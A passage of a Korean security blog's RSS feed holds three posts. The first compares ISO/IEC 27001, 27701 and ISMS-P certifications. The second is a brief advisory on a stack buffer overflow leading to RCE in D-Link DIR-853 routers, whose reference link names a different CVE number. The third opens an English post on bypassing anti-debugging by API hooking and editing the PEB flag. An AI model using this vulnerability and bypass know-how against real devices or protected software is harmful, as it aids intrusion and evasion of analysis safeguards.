&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>ISO/IEC 27001</strong> - <strong>&#xC815;&#xBCF4;&#xBCF4;&#xC548; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;</strong></p></li><li><p><strong>ISO/IEC 27002</strong> - <strong>&#xC815;&#xBCF4;&#xBCF4;&#xC548; &#xD1B5;&#xC81C; &#xC9C0;&#xCE68;</strong></p></li><li><p><strong>ISO/IEC 27017</strong> - <strong>&#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xBCF4;&#xC548; &#xC9C0;&#xCE68;</strong></p></li><li><p><strong>ISO/IEC 27018</strong> - <strong>&#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638; &#xAC00;&#xC774;&#xB4DC;&#xB77C;&#xC778;</strong></p></li><li><p><strong>ISO/IEC 27701</strong> - <strong>&#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;</strong></p></li><li><p><strong>ISO/IEC 27005</strong> - <strong>&#xC815;&#xBCF4;&#xBCF4;&#xC548; &#xB9AC;&#xC2A4;&#xD06C; &#xAD00;&#xB9AC;</strong></p></li><li><p><strong>ISO/IEC 22301</strong> - <strong>&#xBE44;&#xC988;&#xB2C8;&#xC2A4; &#xC5F0;&#xC18D;&#xC131; &#xAD00;&#xB9AC;</strong></p></li></ol><p>&#xBCF4;&#xD1B5; &#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xACFC; &#xAD00;&#xB828;&#xD55C; &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xACE0;&#xC790;&#xD558;&#xB294; &#xAE30;&#xC5C5;&#xB4E4;&#xC740; 27001 (&#xC815;&#xBCF4;&#xBCF4;&#xC548;)&#xC744; &#xAE30;&#xBCF8;&#xC73C;&#xB85C;, 27701 (&#xAC1C;&#xC778;&#xC815;&#xBCF4;),27017/27018 (&#xD074;&#xB77C;&#xC6B0;&#xB4DC;)&#xB4F1;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC11C; &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="ISO-IEC-27001"><a href="#ISO-IEC-27001" class="headerlink" title="ISO/IEC 27001"></a>ISO/IEC 27001</h2><p><strong>ISO/IEC 27001&#xC740; &#xAD6D;&#xC81C;&#xD45C;&#xC900;&#xD654;&#xAE30;&#xAD6C;(ISO)&#xC640; &#xAD6D;&#xC81C;&#xC804;&#xAE30;&#xAE30;&#xC220;&#xC704;&#xC6D0;&#xD68C;(IEC)&#xAC00; &#xACF5;&#xB3D9;&#xC73C;&#xB85C; &#xC81C;&#xC815;&#xD55C; &#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xACBD;&#xC601;&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB300;&#xD55C; &#xAD6D;&#xC81C; &#xD45C;&#xC900;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD45C;&#xC900;&#xC740; &#xC870;&#xC9C1;&#xC758; &#xC815;&#xBCF4; &#xC790;&#xC0B0;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xACE0;, &#xBCF4;&#xC548; &#xC704;&#xD611;&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xAE30;&#xBC00;&#xC131;, &#xBB34;&#xACB0;&#xC131;, &#xAC00;&#xC6A9;&#xC131;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xCCB4;&#xACC4;&#xC801;&#xC778; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC591;&#xD55C; &#xC720;&#xD615;&#xC758; &#xC870;&#xC9C1;(&#xAE30;&#xC5C5;, &#xACF5;&#xACF5;&#xAE30;&#xAD00;, &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC0AC;&#xC5C5;&#xC790; &#xB4F1;)&#xC774; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xB9AC;&#xC2A4;&#xD06C;&#xB97C; &#xC2DD;&#xBCC4;, &#xD3C9;&#xAC00;, &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xBA70;, &#xADF8; &#xC801;&#xD569;&#xC131;&#xC744; &#xC678;&#xBD80; &#xC778;&#xC99D;&#xC744; &#xD1B5;&#xD574; &#xC785;&#xC99D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC778;&#xC99D;&#xC740; &#xC804; &#xC138;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xD1B5;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xC720;&#xB7FD;, &#xBD81;&#xBBF8;, &#xC544;&#xC2DC;&#xC544; &#xB4F1; &#xC5D0;&#xC11C;&#xB294; ISO/IEC 27001 &#xC778;&#xC99D;&#xC774; &#xC2E0;&#xB8B0;&#xC758; &#xAE30;&#xC900;&#xC774; &#xB418;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><p>ISO 27001&#xC740; &#xC870;&#xC9C1;&#xC774; &#xC5C5;&#xBB34;, &#xC7A5;&#xC18C;, &#xC790;&#xC0B0;&#xACFC; &#xAE30;&#xC220;&#xC801; &#xD2B9;&#xC131;&#xC744; &#xACE0;&#xB824;&#xD574; &#xBC18;&#xC601;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xBA70;, &#xC774;&#xB294; &#xACC4;&#xD68D;(Plan), &#xC2E4;&#xD589;(Do), &#xC810;&#xAC80;(Check), &#xC870;&#xCE58;(Act)&#xC778; PDCA &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC21C;&#xD658;&#xC801;&#xC778; &#xD65C;&#xB3D9;&#xC758; &#xC811;&#xADFC; &#xBC29;&#xBC95;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/27/romi0x/security_authentication_ko/image2.png" alt="&#xC0AC;&#xC9C4;"><br>&#xCD9C;&#xCC98;: <a href="https://cdn.standards.iteh.ai/samples/79612/fc6152007e5648b2b175c1e9c2b4a553/ISO-28000-2022.pdf">https://cdn.standards.iteh.ai/samples/79612/fc6152007e5648b2b175c1e9c2b4a553/ISO-28000-2022.pdf</a></p><p>ISO/IEC 27001&#xC740; &#xC815;&#xBCF4;&#xBCF4;&#xC548;&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD56D;&#xBAA9;&#xC73C;&#xB85C; &#xB098;&#xB220; &#xC2EC;&#xC0AC;&#xC640; &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/27/romi0x/security_authentication_ko/image3.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xC2EC;&#xC0AC;&#xB294; &#xAD6D;&#xC81C; &#xC778;&#xC99D;&#xAE30;&#xAD00;&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA70;, &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xC740; &#xD6C4;&#xC5D0;&#xB294; <strong>1&#xB144;&#xC5D0; 1&#xD68C; &#xC774;&#xC0C1; &#xC0AC;&#xD6C4; &#xC2EC;&#xC0AC;</strong>, <strong>3&#xB144;&#xC5D0; 1&#xD68C; &#xAC31;&#xC2E0; &#xC2EC;&#xC0AC;</strong>&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC0AC;&#xD6C4; &#xC2EC;&#xC0AC;&#xC5D0;&#xC11C;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC720;&#xC9C0; &#xBC0F; &#xAC1C;&#xC120; &#xC5EC;&#xBD80;, &#xC8FC;&#xC694; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D; &#xBC18;&#xC601; &#xC5EC;&#xBD80; &#xB4F1;&#xC744; &#xD3C9;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="ISO-IEC-27701"><a href="#ISO-IEC-27701" class="headerlink" title="ISO/IEC 27701"></a>ISO/IEC 27701</h2><p>ISO/IEC 27701&#xC740; &#xAE30;&#xC874;&#xC758; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4;&#xC778; ISO/IEC 27001&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xBA70;, &#xAC1C;&#xC778;&#xC815;&#xBCF4;(PII: Personally Identifiable Information)&#xC758; &#xC218;&#xC9D1;, &#xCC98;&#xB9AC;, &#xC800;&#xC7A5;, &#xD30C;&#xAE30; &#xB4F1; &#xC804; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xC758; &#xBCF4;&#xD638; &#xBC0F; &#xAD00;&#xB9AC; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC744; &#xCD94;&#xAC00;&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. <strong>&#xC989;, ISO 27701&#xC740; ISO 27001 + &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xD655;&#xC7A5;&#xD310;&#xC774;&#xB77C;&#xACE0; &#xBCF4;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</strong></p><p>ISO/IEC 27701&#xC758; &#xC8FC;&#xC694; &#xBAA9;&#xC801;&#xC740; &#xC870;&#xC9C1;&#xC774; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;, &#xC800;&#xC7A5;, &#xCC98;&#xB9AC;, &#xC774;&#xC804;, &#xC0AD;&#xC81C;&#xD558;&#xB294; &#xC804; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xAD00;&#xB828; &#xBC95;&#xADDC;(GDPR, CCPA &#xB4F1;)&#xB97C; &#xD6A8;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC900;&#xC218;&#xD558;&#xACE0;, &#xC815;&#xBCF4;&#xC8FC;&#xCCB4;&#xC758; &#xAD8C;&#xB9AC;&#xB97C; &#xBCF4;&#xD638;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xCCB4;&#xACC4;&#xC801;&#xC778; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4;&#xB97C; &#xC218;&#xB9BD;&#xD558;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>ISO/IEC 27701&#xC740; &#xB2E8;&#xB3C5;&#xC73C;&#xB85C; &#xC778;&#xC99D; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xD45C;&#xC900;&#xC740; &#xC544;&#xB2C8;&#xBA70;, &#xBC18;&#xB4DC;&#xC2DC; ISO/IEC 27001 &#xC778;&#xC99D;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD568;&#xAED8; &#xC2EC;&#xC0AC;&#xBC1B;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC989;, ISO/IEC 27001 &#xC778;&#xC99D;&#xC744; &#xD68D;&#xB4DD;&#xD55C; &#xC870;&#xC9C1;&#xC774; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; ISO/IEC 27701 &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC744; &#xCDA9;&#xC871;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638; &#xC5ED;&#xB7C9;&#xC744; &#xACF5;&#xC2DD;&#xC801;&#xC73C;&#xB85C; &#xC778;&#xC815;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; ISO/IEC 27001&#xC758; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xD1B5;&#xC81C; &#xD56D;&#xBAA9;&#xACFC; &#xD568;&#xAED8; ISO/IEC 27701&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xD55C; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xD1B5;&#xC81C; &#xD56D;&#xBAA9;&#xB4E4;&#xC774; &#xD1B5;&#xD569;&#xC801;&#xC73C;&#xB85C; &#xC2EC;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/27/romi0x/security_authentication_ko/image4.png" alt="&#xC0AC;&#xC9C4;"></p><p>ISO/IEC 27701&#xC740; GDPR, CCPA, APPI(&#xC77C;&#xBCF8;), PDPA(&#xC2F1;&#xAC00;&#xD3EC;&#xB974;) &#xB4F1; &#xC8FC;&#xC694; &#xAD6D;&#xAC00;&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xBC95; &#xB300;&#xC751; &#xCCB4;&#xACC4;&#xB85C; &#xD65C;&#xC6A9;&#xB418;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><p>ISO/IEC 27701 &#xC8FC;&#xC694; &#xD2B9;&#xC9D5;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;:</p><ul><li>&#xAE30;&#xC874; ISO/IEC 27001&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC5D0; &#xAD00;&#xD55C; &#xC694;&#xAD6C; &#xC0AC;&#xD56D;&#xACFC; &#xAC00;&#xC774;&#xB4DC;&#xB77C;&#xC778;&#xC744; &#xD55C;&#xCE35; &#xAC15;&#xD654;</li><li>PII &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xC640; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; &#xC870;&#xC9C1;&#xC774; &#xAC16;&#xCD94;&#xC5B4;&#xC57C; &#xD558;&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xAD00;&#xB9AC;&#xCCB4;&#xACC4; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC744; &#xD3EC;&#xD568;</li><li>EU GDPR &#xC900;&#xC218;&#xB97C; &#xC5FC;&#xB450;&#xC5D0; &#xB450;&#xACE0; &#xC81C;&#xC815;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ISO/IEC 27701&#xACFC; GDPR &#xADDC;&#xC815; &#xAC04; &#xB9F5;&#xD551;&#xC744; &#xC81C;&#xACF5;</li><li>ISO/IEC 27001&#xC758; &#xD655;&#xC7A5;&#xD310;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ISO/IEC 27701 &#xC778;&#xC99D;&#xC744; &#xBC1B;&#xAE30; &#xC6D0;&#xD558;&#xB294; &#xAE30;&#xC5C5;&#xC740; ISO/IEC 27001 &#xC778;&#xC99D;&#xC744; &#xBCF4;&#xC720;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC57C; &#xD568;</li></ul><h2 id="ISO-vs-ISMS-P-&#xBB34;&#xC5C7;&#xC774;-&#xB2E4;&#xB97C;&#xAE4C;"><a href="#ISO-vs-ISMS-P-&#xBB34;&#xC5C7;&#xC774;-&#xB2E4;&#xB97C;&#xAE4C;" class="headerlink" title="ISO vs ISMS(P), &#xBB34;&#xC5C7;&#xC774; &#xB2E4;&#xB97C;&#xAE4C;?"></a>ISO vs ISMS(P), &#xBB34;&#xC5C7;&#xC774; &#xB2E4;&#xB97C;&#xAE4C;?</h2><p>&#xB450; &#xC778;&#xC99D; &#xBAA8;&#xB450; &#xC870;&#xC9C1;&#xC774; &#xCCB4;&#xACC4;&#xC801;&#xC778; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xAC16;&#xCD94;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xC785;&#xC99D;&#xD560; &#xC218; &#xC788;&#xB294; &#xC81C;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC801;&#xC6A9; &#xBC94;&#xC704;&#xC640; &#xBAA9;&#xC801;&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ISO/IEC 27001&#xC740; &#xC804; &#xC138;&#xACC4;&#xC5D0;&#xC11C; &#xC778;&#xC815;&#xB418;&#xB294; &#xAD6D;&#xC81C; &#xC778;&#xC99D;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xC678; &#xC0AC;&#xC5C5;, &#xB2E4;&#xAD6D;&#xC801; &#xACE0;&#xAC1D; &#xB300;&#xC751;&#xC5D0; &#xC720;&#xB9AC;&#xD558;&#xBA70;, &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xBB38;&#xC11C; &#xC911;&#xC2EC;&#xC758; &#xD45C;&#xC900;&#xD654;&#xB41C; &#xC811;&#xADFC;&#xC744; &#xC694;&#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBC18;&#xBA74;, &#xD55C;&#xAD6D;&#xC758; ISMS&#xB294; &#xAD6D;&#xB0B4; &#xBC95;&#xB839;&#xACFC; &#xADDC;&#xC815;&#xC744; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xC2EC;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA70;, &#xC2E4;&#xC81C; &#xC6B4;&#xC601; &#xBC0F; &#xC2E4;&#xBB34; &#xC911;&#xC2EC;&#xC758; &#xC810;&#xAC80;&#xC774; &#xAC15;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; ISO&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638;&#xB97C; &#xBCC4;&#xB3C4;&#xB85C; &#xD655;&#xC7A5;&#xD574;&#xC57C; &#xD558;&#xB294; &#xBC18;&#xBA74;, ISMS&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xAE4C;&#xC9C0; &#xD1B5;&#xD569;&#xD55C; ISMS-P&#xB77C;&#xB294; &#xC778;&#xC99D;&#xCCB4;&#xACC4;&#xB97C; &#xC6B4;&#xC601;&#xD558;&#xACE0; &#xC788;&#xC5B4; &#xAD6D;&#xB0B4; &#xD658;&#xACBD;&#xC5D0; &#xB354; &#xC801;&#xD569;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; <strong>ISO/IEC 27001</strong>, <strong>ISMS</strong>, <strong>ISMS-P</strong> &#xC138; &#xAC00;&#xC9C0; &#xC778;&#xC99D;&#xC744; &#xBE44;&#xAD50;&#xD55C; &#xD45C;&#xC785;&#xB2C8;&#xB2E4;. &#xAC01; &#xC778;&#xC99D;&#xC758; &#xD2B9;&#xC9D5;, &#xC801;&#xC6A9; &#xB300;&#xC0C1;, &#xC778;&#xC99D; &#xBC94;&#xC704; &#xB4F1;&#xC744; &#xD55C;&#xB208;&#xC5D0; &#xBCF4;&#xAE30; &#xC27D;&#xAC8C; &#xC815;&#xB9AC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/27/romi0x/security_authentication_ko/image5.png" alt="&#xC0AC;&#xC9C4;"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/certification/">certification</category>
      
      <category domain="https://hackyboiz.github.io/tags/privacy/">privacy</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-25742: D-Link DIR-853에서 발생하는 Stack-based Buffer Overflow로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/26/newp1ayer48/CVE-2025-25742/</link>
      <guid>https://hackyboiz.github.io/2025/03/26/newp1ayer48/CVE-2025-25742/</guid>
      <pubDate>Wed, 26 Mar 2025 06:30:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://dear-sunshine-ba5.notion.site/D-Link-DIR-85</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://dear-sunshine-ba5.notion.site/D-Link-DIR-853-4-1812386a664480feaf1ceab444b132b3">https://dear-sunshine-ba5.notion.site/D-Link-DIR-853-4-1812386a664480feaf1ceab444b132b3</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Rev. A1 1.20b07 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>D-Link DIR-853 A1 FW1.20B07 &#xC7A5;&#xBE44;&#xB294; &#xBC29;&#xD654;&#xBCBD;&#xC774; &#xB0B4;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xB77C;&#xC6B0;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC7A5;&#xBE44;&#xC5D0;&#xC11C; stack-based buffer overflow&#xB85C; &#xC778;&#xD55C; RCE&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>prog.cgi</code> &#xB0B4;&#xBD80; <code>SetSysEmailSettings</code> &#xBAA8;&#xB4C8; &#xB0B4; <code>AccountPassword</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image1.png" alt><br>HTTP &#xC694;&#xCCAD; &#xD544;&#xB4DC; <code>AccountPassword</code>&#xB294; <code>decrypt_aes()</code>&#xC5D0; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xC774; &#xB418;&#xACE0;, <code>sub_4270F4()</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC; &#xB429;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image2.png" alt><br>&#xD574;&#xB2F9; &#xC778;&#xC790; <code>a2</code>&#xB97C; <code>v6</code>&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xB8E8;&#xD504;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC5D0; &#xAE38;&#xC774; &#xC81C;&#xD55C; &#xBC0F; &#xAC80;&#xC99D;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image3.png" alt></p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>System Log &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; Password &#xAC12;&#xC744; &#xC785;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image4.png" alt></p><p>&#xD574;&#xB2F9; &#xAC12;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>decrypt_aes()</code> &#xAD6C;&#xBB38;&#xC744; &#xD1B5;&#xD574; <code>AccountPassword</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC774; &#xC778;&#xCF54;&#xB529; &#xB418;&#xC5B4; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image5.png" alt></p><p><code>AccountPassword</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC744; &#xBCC0;&#xC870;&#xD558;&#xC5EC; &#xC804;&#xC1A1;&#xD558;&#xBA74;, <code>PC</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC774; &#xBCC0;&#xC870; &#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image6.png" alt><br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image7.png" alt></p><p>&#xD604;&#xC7AC; &#xD574;&#xB2F9; &#xC81C;&#xD488;&#xC740; EOL/EOS &#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC7A5;&#xBE44;&#xB97C; &#xAD50;&#xCCB4;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAD8C;&#xC7A5; &#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57959">https://nvd.nist.gov/vuln/detail/CVE-2024-57959</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/D-Link/">D-Link</category>
      
      <category domain="https://hackyboiz.github.io/tags/DIR-853/">DIR-853</category>
      
      <category domain="https://hackyboiz.github.io/tags/Stack-based-Buffer-Overflow/">Stack-based Buffer Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/Out-of-bounds-Write/">Out-of-bounds Write</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/26/newp1ayer48/CVE-2025-25742/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Anti-Debugging Part 2(EN)</title>
      <link>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/en/</link>
      <guid>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/en/</guid>
      <pubDate>Sun, 23 Mar 2025 15:45:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is OUYA77. &amp;#x1F642;&lt;/p&gt;
&lt;p&gt;Last time, we explored:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Debugging&lt;/strong&gt;: The process of identifying probl</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is OUYA77. &#x1F642;</p><p>Last time, we explored:</p><ul><li><strong>Debugging</strong>: The process of identifying problematic areas in code, narrowing down the scope, analyzing the cause, and resolving issues.</li><li><strong>Anti-debugging</strong>: Techniques used to detect or disrupt debuggers to protect software from reverse engineering and analysis.</li></ul><p>If you haven&#x2019;t checked it out yet, here&#x2019;s the link! &#x1F447; &#x1F606;</p><p><a href="https://hackyboiz.github.io/2024/12/29/OUYA77/Anti_part1/en/"><em>Previous Part: Anti-Debugging Part 1 (EN)</em></a></p><p>In our discussion on anti-debugging techniques, we covered two main categories: <strong>Static</strong> and <strong>Dynamic</strong> methods. <strong>Static</strong> anti-debugging techniques rely on system information or APIs to check if a debugger is attached. For example, in Windows, the <code>IsDebuggerPresent()</code> function can be used to detect a debugger. <strong>Dynamic</strong> techniques, on the other hand, detect debugging through behavioral patterns during program execution, such as timing-based anti-debugging.</p><h2 id="Bypassing-Anti-Debugging-Techniques"><a href="#Bypassing-Anti-Debugging-Techniques" class="headerlink" title="Bypassing Anti-Debugging Techniques"></a>Bypassing Anti-Debugging Techniques</h2><h3 id="Bypassing-Static-Anti-Debugging"><a href="#Bypassing-Static-Anti-Debugging" class="headerlink" title="Bypassing Static Anti-Debugging"></a>Bypassing Static Anti-Debugging</h3><p>Static techniques are relatively simple to implement but can also be bypassed with ease. Here are some common methods to circumvent them:</p><ol><li><strong>API Hooking</strong>: By hooking API functions used for debugger detection, we can intercept and modify their behavior. For instance, in Windows, hooking <code>IsDebuggerPresent()</code> to always return false can effectively hide the debugger.</li><li><strong>Manipulating the PEB Structure</strong>: The <code>BeingDebugged</code> flag in the Process Environment Block (PEB) can be directly modified to conceal the presence of a debugger.</li></ol><h3 